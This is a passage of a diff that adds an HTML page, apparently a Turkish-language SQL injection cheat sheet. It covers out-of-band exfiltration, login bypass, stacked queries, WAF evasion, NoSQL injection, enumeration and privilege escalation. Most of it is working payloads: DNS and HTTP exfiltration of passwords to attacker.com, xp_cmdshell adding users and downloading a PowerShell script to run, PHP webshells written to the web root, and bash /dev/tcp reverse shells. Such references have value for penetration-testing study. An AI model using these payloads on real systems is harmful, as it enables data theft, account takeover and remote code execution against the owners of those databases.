+<span class="kw">for</span> i <span class="kw">in</span> <span class="fn">range</span>(<span class="num">1</span>, <span class="num">33</span>):
+    result += <span class="fn">extract_char</span>(i, <span class="str">'http://target.com/user'</span>, {})</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- OOB -->
+  <div class="section" id="oob">
+    <div class="section-header">Out-of-Band (OOB) / DNS Exfil</div>
+    <div class="grid2">
+      <div class="card">
+        <div class="card-title">MySQL — LOAD_FILE + UNC <span class="badge badge-red">Windows only</span></div>
+        <div class="code-block"><span class="cmt">-- DNS exfil via UNC path</span>
+<span class="kw">SELECT</span> <span class="fn">load_file</span>(<span class="fn">concat</span>(<span class="str">'\\\\'</span>,
+  (<span class="kw">SELECT</span> <span class="fn">database</span>()),
+  <span class="str">'.attacker.com\\x'</span>));
+
+<span class="cmt">-- Collaborator ile</span>
+<span class="kw">SELECT</span> <span class="fn">load_file</span>(<span class="fn">concat</span>(<span class="str">'\\\\'</span>,
+  <span class="fn">hex</span>(<span class="fn">password</span>),
+  <span class="str">'.burpcollab.net\\x'</span>))
+<span class="kw">FROM</span> users <span class="kw">WHERE</span> id=<span class="num">1</span>;</div>
+      </div>
+      <div class="card">
+        <div class="card-title">MSSQL — xp_dirtree / xp_fileexist</div>
+        <div class="code-block"><span class="cmt">-- DNS lookup tetikle</span>
+<span class="kw">EXEC</span> master..xp_dirtree
+  <span class="str">'\\'</span>+(<span class="kw">SELECT</span> <span class="fn">db_name</span>())+
+  <span class="str">'.attacker.com\x'</span>
+
+<span class="cmt">-- xp_fileexist</span>
+<span class="kw">EXEC</span> xp_fileexist
+  <span class="str">'\\'</span>+(<span class="kw">SELECT</span> <span class="fn">top</span> <span class="num">1</span> password
+  <span class="kw">FROM</span> users)+<span class="str">'.attacker.com\x'</span>
+
+<span class="cmt">-- sp_makewebtask (eski)</span>
+<span class="kw">EXEC</span> sp_makewebtask
+  <span class="str">'\\attacker.com\x'</span>,<span class="str">'SELECT 1'</span></div>
+      </div>
+    </div>
+    <div class="grid2">
+      <div class="card">
+        <div class="card-title">Oracle — UTL_HTTP / UTL_FILE</div>
+        <div class="code-block"><span class="cmt">-- HTTP ile exfil</span>
+<span class="kw">SELECT</span> <span class="fn">utl_http.request</span>(
+  <span class="str">'http://attacker.com/'</span>||
+  (<span class="kw">SELECT</span> password <span class="kw">FROM</span> users
+   <span class="kw">WHERE</span> rownum=<span class="num">1</span>))
+<span class="kw">FROM</span> dual;
+
+<span class="cmt">-- DNS lookup</span>
+<span class="kw">SELECT</span> <span class="fn">utl_inaddr.get_host_address</span>(
+  (<span class="kw">SELECT</span> banner <span class="kw">FROM</span> v$version
+   <span class="kw">WHERE</span> rownum=<span class="num">1</span>)||<span class="str">'.attacker.com'</span>)
+<span class="kw">FROM</span> dual;</div>
+      </div>
+      <div class="card">
+        <div class="card-title">PostgreSQL — COPY TO / lo_export</div>
+        <div class="code-block"><span class="cmt">-- /etc/passwd oku (SUPERUSER gerek)</span>
+<span class="kw">COPY</span> (SELECT <span class="str">''</span>) <span class="kw">TO</span> PROGRAM
+  <span class="str">'curl http://attacker.com/'</span>||
+  (<span class="kw">SELECT</span> current_user);
+
+<span class="cmt">-- dblink ile DNS</span>
+<span class="kw">SELECT</span> dblink_connect(
+  <span class="str">'host='</span>||(<span class="kw">SELECT</span> current_user)||
+  <span class="str">'.attacker.com user=a password=a'</span>
+  <span class="str">' dbname=a'</span>);</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- AUTH BYPASS -->
+  <div class="section" id="auth">
+    <div class="section-header">Authentication Bypass</div>
+    <div class="grid1">
+      <div class="card">
+        <div class="card-title">Login Form Bypass Payload Listesi</div>
+        <table class="cstable">
+          <tr><th>Kullanıcı Adı</th><th>Şifre</th><th>Açıklama</th></tr>
+          <tr><td><code>admin' --</code></td><td><code>anything</code></td><td>Şifre kontrolünü yorum satırına al</td></tr>
+          <tr><td><code>admin'#</code></td><td><code>anything</code></td><td>MySQL yorum</td></tr>
+          <tr><td><code>' OR 1=1--</code></td><td><code>x</code></td><td>İlk kaydı döndür</td></tr>
+          <tr><td><code>' OR 'x'='x</code></td><td><code>' OR 'x'='x</code></td><td>Her iki field'a</td></tr>
+          <tr><td><code>admin'/*</code></td><td><code>*/--</code></td><td>Multi-field yorum</td></tr>
+          <tr><td><code>' OR 1=1 LIMIT 1--</code></td><td><code>x</code></td><td>Tek satır zorla</td></tr>
+          <tr><td><code>') OR ('1'='1</code></td><td><code>x</code></td><td>Parantezli context</td></tr>
+          <tr><td><code>admin') --</code></td><td><code>x</code></td><td>Parenthesis kapatma</td></tr>
+          <tr><td><code>' UNION SELECT 1,'admin','hash'--</code></td><td><code>hash</code></td><td>UNION ile sahte kayıt</td></tr>
+        </table>
+      </div>
+    </div>
+    <div class="grid2">
+      <div class="card">
+        <div class="card-title">Tipik Sorgu Analizi</div>
+        <div class="code-block"><span class="cmt">-- Orijinal sorgu</span>
+<span class="kw">SELECT</span> * <span class="kw">FROM</span> users
+<span class="kw">WHERE</span> user=<span class="str">'$u'</span> <span class="kw">AND</span> pass=<span class="fn">md5</span>(<span class="str">'$p'</span>);
+
+<span class="cmt">-- Inject sonrası (user: admin'--)</span>
+<span class="kw">SELECT</span> * <span class="kw">FROM</span> users
+<span class="kw">WHERE</span> user=<span class="str">'admin'</span><span class="danger">--</span><span class="cmt">' AND pass=md5('x');</span>
+
+<span class="cmt">-- OR bypass</span>
+<span class="kw">SELECT</span> * <span class="kw">FROM</span> users
+<span class="kw">WHERE</span> user=<span class="str">''</span> <span class="kw">OR</span> <span class="str">'1'</span>=<span class="str">'1'</span><span class="danger">--</span>
+<span class="kw">AND</span> pass=<span class="fn">md5</span>(<span class="str">'x'</span>);</div>
+      </div>
+      <div class="card">
+        <div class="card-title">Remember-Me / Token Bypass</div>
+        <div class="code-block"><span class="cmt">-- Cookie'deki token SQLi</span>
+Cookie: token=<span class="danger">1' OR 1=1--</span>
+Cookie: remember=<span class="danger">admin'--</span>
+
+<span class="cmt">-- Sorgu örneği</span>
+<span class="kw">SELECT</span> user_id <span class="kw">FROM</span> sessions
+<span class="kw">WHERE</span> token=<span class="str">'$token'</span>
+<span class="cmt">-- → token='' OR 1=1--</span>
+
+<span class="cmt">-- UNION ile session hijack</span>
+<span class="kw">UNION SELECT</span> user_id <span class="kw">FROM</span> users
+<span class="kw">WHERE</span> username=<span class="str">'admin'</span>--</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- STACKED / 2ND ORDER -->
+  <div class="section" id="stacked">
+    <div class="section-header">Stacked Queries & Second-Order SQLi</div>
+    <div class="grid2">
+      <div class="card">
+        <div class="card-title">Stacked Queries <span class="badge badge-amber">driver bağımlı</span></div>
+        <div class="code-block"><span class="cmt">-- MSSQL (her zaman çalışır)</span>
+<span class="str">'</span>; <span class="kw">INSERT INTO</span> users <span class="kw">VALUES</span>
+  (<span class="str">'hacker'</span>,<span class="str">'p4ss'</span>)--
+
+<span class="str">'</span>; <span class="kw">DROP TABLE</span> users--
+<span class="str">'</span>; <span class="kw">EXEC</span> xp_cmdshell(<span class="str">'whoami'</span>)--
+
+<span class="cmt">-- MySQL (PDO/multi-query ile)</span>
+<span class="str">'</span>; <span class="kw">UPDATE</span> users <span class="kw">SET</span> password=<span class="str">'pwned'</span>
+   <span class="kw">WHERE</span> username=<span class="str">'admin'</span>;--
+
+<span class="cmt">-- PostgreSQL</span>
+<span class="str">'</span>; <span class="kw">COPY</span> users <span class="kw">TO</span> <span class="str">'/tmp/dump.csv'</span>;--</div>
+      </div>
+      <div class="card">
+        <div class="card-title">Second-Order SQLi <span class="badge badge-red">sinsice</span></div>
+        <div class="code-block"><span class="cmt">-- Adım 1: Kayıt sırasında payload sakla</span>
+username = <span class="danger">admin'--</span>
+<span class="cmt">→ DB'ye escaped olarak girer</span>
+<span class="cmt">→ Görünür: admin'--</span>
+
+<span class="cmt">-- Adım 2: Sonra kullanılınca tetiklenir</span>
+<span class="kw">UPDATE</span> users <span class="kw">SET</span> pass=<span class="str">'new'</span>
+<span class="kw">WHERE</span> user=<span class="str">'$username'</span>
+<span class="cmt">→ WHERE user='admin'--'</span>
+<span class="cmt">→ TÜM admin şifresi değişir!</span>
+
+<span class="cmt">-- Tespit: kayıt → işlem arası fark</span></div>
+      </div>
+    </div>
+    <div class="grid1">
+      <div class="card">
+        <div class="card-title">MSSQL — xp_cmdshell ile RCE</div>
+        <div class="code-block"><span class="cmt">-- xp_cmdshell aktif etme</span>
+<span class="kw">EXEC</span> sp_configure <span class="str">'show advanced options'</span>, <span class="num">1</span>; <span class="kw">RECONFIGURE</span>;
+<span class="kw">EXEC</span> sp_configure <span class="str">'xp_cmdshell'</span>, <span class="num">1</span>; <span class="kw">RECONFIGURE</span>;
+
+<span class="cmt">-- Komut çalıştır</span>
+<span class="kw">EXEC</span> xp_cmdshell <span class="str">'whoami'</span>;
+<span class="kw">EXEC</span> xp_cmdshell <span class="str">'net user hacker P@ss123 /add'</span>;
+<span class="kw">EXEC</span> xp_cmdshell <span class="str">'powershell -c "IEX(IWR http://attacker.com/shell.ps1)"'</span>;
+
+<span class="cmt">-- Devre dışı bırakılmış → alternatifler</span>
+<span class="kw">EXEC</span> sp_OACreate <span class="str">'WScript.Shell'</span>, @shell <span class="kw">OUTPUT</span>;
+<span class="kw">EXEC</span> sp_OAMethod @shell, <span class="str">'Run'</span>, <span class="kw">NULL</span>, <span class="str">'cmd /c whoami'</span>;</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- FILE R/W -->
+  <div class="section" id="file">
+    <div class="section-header">File Read / Write</div>
+    <div class="grid2">
+      <div class="card">
+        <div class="card-title">MySQL — LOAD_FILE <span class="badge badge-amber">FILE priv gerek</span></div>
+        <div class="code-block"><span class="cmt">-- Dosya oku</span>
+<span class="kw">SELECT</span> <span class="fn">load_file</span>(<span class="str">'/etc/passwd'</span>);
+<span class="kw">SELECT</span> <span class="fn">load_file</span>(<span class="str">'/var/www/html/config.php'</span>);
+<span class="kw">SELECT</span> <span class="fn">load_file</span>(<span class="num">0x2f6574632f706173737764</span>);
+
+<span class="cmt">-- UNION ile exfil</span>
+<span class="kw">UNION SELECT</span> <span class="fn">load_file</span>(<span class="str">'/etc/shadow'</span>),
+<span class="num">2</span>,<span class="num">3</span>--
+
+<span class="cmt">-- Gereksinimler</span>
+<span class="cmt">-- FILE privilege</span>
+<span class="cmt">-- secure_file_priv = '' ya da path match</span>
+<span class="cmt">-- show variables like 'secure%'</span></div>
+      </div>
+      <div class="card">
+        <div class="card-title">MySQL — INTO OUTFILE / DUMPFILE</div>
+        <div class="code-block"><span class="cmt">-- Webshell yaz</span>
+<span class="kw">SELECT</span> <span class="str">'&lt;?php system($_GET["cmd"]); ?&gt;'</span>
+<span class="kw">INTO OUTFILE</span> <span class="str">'/var/www/html/shell.php'</span>;
+
+<span class="cmt">-- UNION ile webshell drop</span>
+<span class="kw">UNION SELECT</span> <span class="str">'&lt;?php passthru($_REQUEST["c"])?&gt;'</span>,
+<span class="num">2</span>,<span class="num">3</span> <span class="kw">INTO OUTFILE</span> <span class="str">'/var/www/html/x.php'</span>--
+
+<span class="cmt">-- DUMPFILE: binary dosyalar için (newline yok)</span>
+<span class="kw">SELECT</span> 0xDEADBEEF <span class="kw">INTO DUMPFILE</span> <span class="str">'/tmp/x'</span>;
+
+<span class="cmt">-- Secure_file_priv bypass → symlink</span></div>
+      </div>
+    </div>
+    <div class="grid2">
+      <div class="card">
+        <div class="card-title">PostgreSQL — COPY FROM/TO</div>
+        <div class="code-block"><span class="cmt">-- Dosya oku</span>
+<span class="kw">COPY</span> users(data) <span class="kw">FROM</span> <span class="str">'/etc/passwd'</span>;
+<span class="kw">SELECT</span> * <span class="kw">FROM</span> users;
+
+<span class="cmt">-- Komut çalıştır (SUPERUSER)</span>
+<span class="kw">COPY</span> (<span class="kw">SELECT</span> <span class="str">''</span>) <span class="kw">TO</span> PROGRAM <span class="str">'id > /tmp/out'</span>;
+
+<span class="cmt">-- Large object ile dosya yaz</span>
+<span class="kw">SELECT</span> <span class="fn">lo_from_bytea</span>(<span class="num">0</span>,
+  <span class="str">'&lt;?php system($_GET[c]);?&gt;'</span>::bytea);
+<span class="kw">SELECT</span> <span class="fn">lo_export</span>(oid,<span class="str">'/var/www/s.php'</span>)
+<span class="kw">FROM</span> pg_largeobject_metadata;</div>
+      </div>
+      <div class="card">
+        <div class="card-title">MSSQL — Bulk Insert / BCP</div>
+        <div class="code-block"><span class="cmt">-- Dosya oku</span>
+<span class="kw">BULK INSERT</span> tmptable
+<span class="kw">FROM</span> <span class="str">'C:\Windows\System32\drivers\etc\hosts'</span>
+<span class="kw">WITH</span> (ROWTERMINATOR=<span class="str">'\n'</span>);
+
+<span class="cmt">-- OPENROWSET ile oku</span>
+<span class="kw">SELECT</span> * <span class="kw">FROM</span>
+<span class="fn">OPENROWSET</span>(BULK <span class="str">'C:\secret.txt'</span>,
+  SINGLE_CLOB) <span class="kw">AS</span> tmp;
+
+<span class="cmt">-- BCP ile yaz (xp_cmdshell ile)</span>
+<span class="kw">EXEC</span> xp_cmdshell
+<span class="str">'bcp "SELECT top 1 * FROM users" queryout C:\out.txt -c -T'</span></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- WAF BYPASS -->
+  <div class="section" id="waf">
+    <div class="section-header">WAF Bypass Teknikleri</div>
+    <div class="grid1">
+      <div class="card">
+        <div class="card-title">Keyword Bypass Yöntemleri</div>
+        <table class="cstable">
+          <tr><th>Teknik</th><th>Örnek</th></tr>
+          <tr><td>Case variation</td><td><code>SeLeCt</code>, <code>uNiOn</code></td></tr>
+          <tr><td>Comment injection</td><td><code>SEL/**/ECT</code>, <code>UN/**/ION</code></td></tr>
+          <tr><td>URL encode</td><td><code>%55NION</code>, <code>%53ELECT</code></td></tr>
+          <tr><td>Double encode</td><td><code>%2553ELECT</code></td></tr>
+          <tr><td>Null byte</td><td><code>SEL%00ECT</code></td></tr>
+          <tr><td>Scientific notation</td><td><code>1e0 UNION</code> (MySQL)</td></tr>
+          <tr><td>Whitespace sub</td><td><code>SELECT%09FROM</code> (tab), <code>%0a</code>, <code>%0d</code></td></tr>
+          <tr><td>Keyword in hex</td><td><code>0x53454C454354</code></td></tr>
+          <tr><td>MySQL special</td><td><code>/*!UNION*/</code>, <code>/*!50000UNION*/</code></td></tr>
+          <tr><td>Nested comments</td><td><code>SE/*comment*/LECT</code></td></tr>
+        </table>
+      </div>
+    </div>
+    <div class="grid2">
+      <div class="card">
+        <div class="card-title">Quote Bypass</div>
+        <div class="code-block"><span class="cmt">-- String literal olmadan</span>
+<span class="fn">char</span>(<span class="num">97</span>,<span class="num">100</span>,<span class="num">109</span>,<span class="num">105</span>,<span class="num">110</span>)  <span class="cmt">→ 'admin'</span>
+
+<span class="cmt">-- Hex</span>
+<span class="num">0x61646d696e</span>  <span class="cmt">→ 'admin'</span>
+
+<span class="cmt">-- concat ile</span>
+<span class="fn">concat</span>(<span class="fn">char</span>(<span class="num">97</span>),<span class="fn">char</span>(<span class="num">100</span>))
+
+<span class="cmt">-- MySQL</span>
+<span class="kw">WHERE</span> username=<span class="fn">unhex</span>(<span class="str">'61646d696e'</span>)
+
+<span class="cmt">-- MSSQL</span>
+<span class="kw">WHERE</span> username=<span class="num">0x61646d696e</span></div>
+      </div>
+      <div class="card">
+        <div class="card-title">Space & Separator Bypass</div>
+        <div class="code-block"><span class="cmt">-- Space alternatifleri</span>
+/**/ <span class="cmt">→ comment</span>
+%09 <span class="cmt">→ tab</span>
+%0a <span class="cmt">→ newline</span>
+%0d <span class="cmt">→ carriage return</span>
+%0c <span class="cmt">→ form feed</span>
+%a0 <span class="cmt">→ non-breaking space</span>
+
+<span class="cmt">-- Örnek kullanım</span>
+SEL/**/ECT/**/1/**/FROM/**/users
+
+<span class="cmt">-- MySQL backtick</span>
+SELECT`username`FROM`users`
+
+<span class="cmt">-- MSSQL köşeli parantez</span>
+SELECT[username]FROM[users]</div>
+      </div>
+    </div>
+    <div class="grid1">
+      <div class="card">
+        <div class="card-title">HTTP-Level WAF Bypass</div>
+        <table class="cstable">
+          <tr><th>Teknik</th><th>Açıklama</th></tr>
+          <tr><td>Chunked Transfer Encoding</td><td>Body'yi parçalara böl, WAF assembly yapamazsa geçer</td></tr>
+          <tr><td>Content-Type değiştirme</td><td><code>application/json</code> yerine <code>text/plain</code> — WAF parse etmez</td></tr>
+          <tr><td>HTTP Parameter Pollution</td><td><code>?id=1&id=1 OR 1=1</code> — bazı WAF ilkini, app ikincisini alır</td></tr>
+          <tr><td>Multipart boundary</td><td>POST'u multipart yap, bazı WAF analiz etmez</td></tr>
+          <tr><td>X-Forwarded-For / X-Real-IP</td><td>Whitelist IP bypass — WAF rule'u atla</td></tr>
+          <tr><td>Burp Turbo Intruder</td><td>Rate limit + WAF detection threshold'unu aş</td></tr>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <!-- NOSQL -->
+  <div class="section" id="nosql">
+    <div class="section-header">NoSQL Injection (MongoDB odaklı)</div>
+    <div class="grid2">
+      <div class="card">
+        <div class="card-title">MongoDB Operator Injection</div>
+        <div class="code-block"><span class="cmt">-- JSON body'de</span>
+{<span class="str">"username"</span>: {<span class="str">"$ne"</span>: <span class="str">""</span>},
+ <span class="str">"password"</span>: {<span class="str">"$ne"</span>: <span class="str">""</span>}}
+
+<span class="cmt">-- Query param'da (POST urlencoded)</span>
+username[$ne]=x&password[$ne]=x
+
+<span class="cmt">-- $gt ile</span>
+username[$gt]=&password[$gt]=
+
+<span class="cmt">-- $regex ile brute</span>
+{<span class="str">"username"</span>: <span class="str">"admin"</span>,
+ <span class="str">"password"</span>: {<span class="str">"$regex"</span>: <span class="str">"^a"</span>}}
+
+<span class="cmt">-- $where (JS injection!)</span>
+{<span class="str">"$where"</span>: <span class="str">"this.user=='admin'"</span>}</div>
+      </div>
+      <div class="card">
+        <div class="card-title">MongoDB Blind Extraction</div>
+        <div class="code-block"><span class="cmt">-- $regex ile char by char</span>
+{<span class="str">"username"</span>: <span class="str">"admin"</span>,
+ <span class="str">"password"</span>: {<span class="str">"$regex"</span>: <span class="str">"^p"</span>}}
+<span class="cmt">→ 200: ilk char 'p'</span>
+
+{<span class="str">"username"</span>: <span class="str">"admin"</span>,
+ <span class="str">"password"</span>: {<span class="str">"$regex"</span>: <span class="str">"^pa"</span>}}
+<span class="cmt">→ 200: devam et</span>
+
+<span class="cmt">-- $where ile JS sleep</span>
+{<span class="str">"$where"</span>: <span class="str">"sleep(5000)||1"</span>}
+
+<span class="cmt">-- $where field oku</span>
+{<span class="str">"$where"</span>:
+  <span class="str">"this.password.match(/^a/)"</span>}</div>
+      </div>
+    </div>
+    <div class="grid1">
+      <div class="card">
+        <div class="card-title">NoSQL vs SQL Karşılaştırması</div>
+        <table class="cstable">
+          <tr><th>Konsept</th><th>SQL</th><th>MongoDB NoSQL</th></tr>
+          <tr><td>Auth bypass</td><td><code>' OR 1=1--</code></td><td><code>{"$ne": ""}</code></td></tr>
+          <tr><td>Tüm kayıt</td><td><code>OR 1=1</code></td><td><code>{"$gt": ""}</code></td></tr>
+          <tr><td>Blind exfil</td><td><code>ascii(substr(...))</code></td><td><code>{"$regex": "^a"}</code></td></tr>
+          <tr><td>Time-based</td><td><code>SLEEP(5)</code></td><td><code>{"$where": "sleep(5000)"}</code></td></tr>
+          <tr><td>Comment</td><td><code>--</code>, <code>#</code></td><td>N/A</td></tr>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <!-- DB FINGERPRINT -->
+  <div class="section" id="dbinfo">
+    <div class="section-header">DB Fingerprinting & Enumeration</div>
+    <div class="grid1">
+      <div class="card">
+        <div class="card-title">DB Tipi Tespiti — Fonksiyon Farkları</div>
+        <table class="cstable">
+          <tr><th>Sorgu</th><th>MySQL</th><th>MSSQL</th><th>Oracle</th><th>PostgreSQL</th><th>SQLite</th></tr>
+          <tr><td>Version</td><td><code>version()</code></td><td><code>@@version</code></td><td><code>v$version</code></td><td><code>version()</code></td><td><code>sqlite_version()</code></td></tr>
+          <tr><td>DB adı</td><td><code>database()</code></td><td><code>db_name()</code></td><td><code>ora_database_name</code></td><td><code>current_database()</code></td><td>N/A</td></tr>
+          <tr><td>Kullanıcı</td><td><code>user()</code></td><td><code>system_user</code></td><td><code>user</code></td><td><code>current_user</code></td><td>N/A</td></tr>
+          <tr><td>String concat</td><td><code>concat(a,b)</code></td><td><code>a+b</code></td><td><code>a||b</code></td><td><code>a||b</code></td><td><code>a||b</code></td></tr>
+          <tr><td>Substring</td><td><code>substr()</code></td><td><code>substring()</code></td><td><code>substr()</code></td><td><code>substr()</code></td><td><code>substr()</code></td></tr>
+          <tr><td>Dual table</td><td>Gerekmiyor</td><td>Gerekmiyor</td><td><code>FROM dual</code></td><td>Gerekmiyor</td><td>Gerekmiyor</td></tr>
+          <tr><td>Limit</td><td><code>LIMIT n</code></td><td><code>TOP n</code></td><td><code>ROWNUM&lt;=n</code></td><td><code>LIMIT n</code></td><td><code>LIMIT n</code></td></tr>
+          <tr><td>Hex string</td><td><code>0x61</code></td><td><code>0x61</code></td><td><code>chr(97)</code></td><td><code>chr(97)</code></td><td><code>char(97)</code></td></tr>
+        </table>
+      </div>
+    </div>
+    <div class="grid2">
+      <div class="card">
+        <div class="card-title">MySQL Enumeration</div>
+        <div class="code-block"><span class="cmt">-- Tüm DB'ler</span>
+<span class="kw">SELECT</span> schema_name <span class="kw">FROM</span>
+information_schema.schemata;
+
+<span class="cmt">-- Tablolar</span>
+<span class="kw">SELECT</span> table_name <span class="kw">FROM</span>
+information_schema.tables
+<span class="kw">WHERE</span> table_schema=<span class="fn">database</span>();
+
+<span class="cmt">-- Kolonlar</span>
+<span class="kw">SELECT</span> column_name,column_type
+<span class="kw">FROM</span> information_schema.columns
+<span class="kw">WHERE</span> table_name=<span class="str">'users'</span>;
+
+<span class="cmt">-- Kullanıcı hash'leri</span>
+<span class="kw">SELECT</span> user,password
+<span class="kw">FROM</span> mysql.user;
+
+<span class="cmt">-- Yetkiler</span>
+<span class="kw">SHOW GRANTS FOR</span> current_user();</div>
+      </div>
+      <div class="card">
+        <div class="card-title">MSSQL Enumeration</div>
+        <div class="code-block"><span class="cmt">-- Tüm DB'ler</span>
+<span class="kw">SELECT</span> name <span class="kw">FROM</span> master..sysdatabases;
+
+<span class="cmt">-- Tablolar</span>
+<span class="kw">SELECT</span> name <span class="kw">FROM</span> sysobjects
+<span class="kw">WHERE</span> xtype=<span class="str">'U'</span>;
+
+<span class="cmt">-- Kolonlar</span>
+<span class="kw">SELECT</span> name <span class="kw">FROM</span> syscolumns
+<span class="kw">WHERE</span> id=<span class="fn">object_id</span>(<span class="str">'users'</span>);
+
+<span class="cmt">-- SA yetkisi var mı?</span>
+<span class="kw">SELECT</span> IS_SRVROLEMEMBER(<span class="str">'sysadmin'</span>);
+
+<span class="cmt">-- Linked servers</span>
+<span class="kw">EXEC</span> sp_linkedservers;</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PRIV ESC -->
+  <div class="section" id="privesc">
+    <div class="section-header">Privilege Escalation via SQLi</div>
+    <div class="grid2">
+      <div class="card">
+        <div class="card-title">MySQL — UDF ile OS Komut</div>
+        <div class="code-block"><span class="cmt">-- Adım 1: plugin dizinini bul</span>
+<span class="kw">SELECT</span> @@plugin_dir;
+<span class="cmt">-- /usr/lib/mysql/plugin/</span>
+
+<span class="cmt">-- Adım 2: UDF .so yükle</span>
+<span class="kw">SELECT</span> 0x[hex_of_udf_so]
+<span class="kw">INTO DUMPFILE</span> <span class="str">'/usr/lib/mysql/plugin/udf.so'</span>;
+
+<span class="cmt">-- Adım 3: Fonksiyon oluştur</span>
+<span class="kw">CREATE FUNCTION</span> sys_exec
+<span class="kw">RETURNS INT</span>
+<span class="kw">SONAME</span> <span class="str">'udf.so'</span>;
+
+<span class="cmt">-- Adım 4: RCE!</span>
+<span class="kw">SELECT</span> sys_exec(<span class="str">'id'</span>);
+<span class="kw">SELECT</span> sys_exec(<span class="str">'bash -i >& /dev/tcp/attacker/4444 0>&1'</span>);</div>
+      </div>
+      <div class="card">
+        <div class="card-title">MSSQL — Token Impersonation</div>
+        <div class="code-block"><span class="cmt">-- Impersonate edilebilir kullanıcılar</span>
+<span class="kw">SELECT</span> distinct b.name
+<span class="kw">FROM</span> sys.server_permissions a
+<span class="kw">INNER JOIN</span> sys.server_principals b
+<span class="kw">ON</span> a.grantor_principal_id=b.principal_id
+<span class="kw">WHERE</span> a.permission_name=<span class="str">'IMPERSONATE'</span>;
+
+<span class="cmt">-- SA impersonate</span>
+<span class="kw">EXECUTE AS LOGIN</span> = <span class="str">'sa'</span>;
+<span class="kw">EXEC</span> xp_cmdshell <span class="str">'whoami'</span>;
+
+<span class="cmt">-- DB OWNER ile trustworthy</span>
+<span class="kw">EXECUTE AS USER</span> = <span class="str">'dbo'</span>;
+<span class="kw">SELECT</span> IS_MEMBER(<span class="str">'db_owner'</span>);</div>
+      </div>
+    </div>
+    <div class="grid2">
+      <div class="card">
+        <div class="card-title">PostgreSQL — Superuser Escalation</div>
+        <div class="code-block"><span class="cmt">-- Mevcut yetkileri kontrol</span>
+<span class="kw">SELECT</span> current_user, session_user;
+<span class="kw">SELECT</span> usesuper <span class="kw">FROM</span> pg_user
+<span class="kw">WHERE</span> usename=current_user;
+
+<span class="cmt">-- pg_read_file (pg 10+)</span>
+<span class="kw">SELECT</span> pg_read_file(<span class="str">'/etc/passwd'</span>);
+
+<span class="cmt">-- COPY TO PROGRAM (superuser)</span>
+<span class="kw">COPY</span> (<span class="kw">SELECT</span> <span class="str">''</span>)
+<span class="kw">TO</span> PROGRAM <span class="str">'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'</span>;
+
+<span class="cmt">-- Lo_import ile dosya yaz</span>
+<span class="kw">SELECT</span> <span class="fn">lo_import</span>(<span class="str">'/etc/passwd'</span>);</div>
+      </div>
+      <div class="card">
+        <div class="card-title">SQLi → RCE Yolları Özet</div>
+        <table class="cstable">
+          <tr><th>DB</th><th>Yöntem</th><th>Şart</th></tr>
+          <tr><td>MySQL</td><td>INTO OUTFILE webshell</td><td>FILE priv + web root yazılabilir</td></tr>
+          <tr><td>MySQL</td><td>UDF yükle</td><td>FILE priv + plugin dizin</td></tr>
+          <tr><td>MSSQL</td><td>xp_cmdshell</td><td>sysadmin</td></tr>
+          <tr><td>MSSQL</td><td>sp_OACreate</td><td>sysadmin</td></tr>
+          <tr><td>PostgreSQL</td><td>COPY TO PROGRAM</td><td>superuser</td></tr>
+          <tr><td>PostgreSQL</td><td>lo_export webshell</td><td>superuser + web root</td></tr>
+          <tr><td>Oracle</td><td>Java stored proc</td><td>JAVA privilege</td></tr>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <!-- FILTER REF -->
+  <div class="section" id="filter">
+    <div class="section-header">Filter & Encoding Reference</div>
+    <div class="grid2">
+      <div class="card">
+        <div class="card-title">Comment Syntax</div>
+        <table class="cstable">
+          <tr><th>DB</th><th>Syntax</th></tr>
+          <tr><td>MySQL</td><td><code>-- comment</code>, <code>#</code>, <code>/*comment*/</code></td></tr>
+          <tr><td>MySQL</td><td><code>/*!comment*/</code> (versioned exec)</td></tr>
+          <tr><td>MSSQL</td><td><code>-- comment</code>, <code>/*comment*/</code></td></tr>
+          <tr><td>Oracle</td><td><code>-- comment</code>, <code>/*comment*/</code></td></tr>
+          <tr><td>PostgreSQL</td><td><code>-- comment</code>, <code>/*comment*/</code></td></tr>
+          <tr><td>SQLite</td><td><code>-- comment</code>, <code>/*comment*/</code></td></tr>
+        </table>
+      </div>
+      <div class="card">
+        <div class="card-title">String Concat Syntax</div>
+        <table class="cstable">
+          <tr><th>DB</th><th>Syntax</th></tr>
+          <tr><td>MySQL</td><td><code>concat('a','b')</code> veya <code>'a' 'b'</code></td></tr>
+          <tr><td>MSSQL</td><td><code>'a'+'b'</code></td></tr>
+          <tr><td>Oracle</td><td><code>'a'||'b'</code> veya <code>concat()</code></td></tr>
+          <tr><td>PostgreSQL</td><td><code>'a'||'b'</code></td></tr>
+          <tr><td>SQLite</td><td><code>'a'||'b'</code></td></tr>
+        </table>
+      </div>
+    </div>
+    <div class="grid2">
+      <div class="card">
+        <div class="card-title">Kritik Fonksiyonlar Quick Ref</div>
+        <div class="code-block"><span class="cmt">-- MySQL</span>
+<span class="fn">ascii</span>(), <span class="fn">char</span>(), <span class="fn">substr</span>(), <span class="fn">mid</span>(), <span class="fn">left</span>()
+<span class="fn">hex</span>(), <span class="fn">unhex</span>(), <span class="fn">bin</span>()
+<span class="fn">concat</span>(), <span class="fn">group_concat</span>()
+<span class="fn">length</span>(), <span class="fn">locate</span>(), <span class="fn">instr</span>()
+<span class="fn">ifnull</span>(), <span class="fn">nullif</span>(), <span class="fn">coalesce</span>()
+<span class="fn">benchmark</span>(), <span class="fn">sleep</span>()
+<span class="fn">load_file</span>(), <span class="fn">into_outfile</span>()
+
+<span class="cmt">-- MSSQL</span>
+<span class="fn">ascii</span>(), <span class="fn">char</span>(), <span class="fn">substring</span>()
+<span class="fn">convert</span>(), <span class="fn">cast</span>()
+<span class="fn">waitfor</span> delay, <span class="fn">openrowset</span>()
+<span class="fn">xp_cmdshell</span>(), <span class="fn">xp_dirtree</span>()</div>
+      </div>
+      <div class="card">
+        <div class="card-title">sqlmap Hızlı Referans</div>
+        <div class="code-block"><span class="cmt"># Temel tarama</span>
+sqlmap -u <span class="str">"http://target/?id=1"</span> --dbs
+
+<span class="cmt"># Tablo ve veri</span>
+sqlmap -u <span class="str">"url"</span> -D mydb --tables
+sqlmap -u <span class="str">"url"</span> -D mydb -T users --dump
+
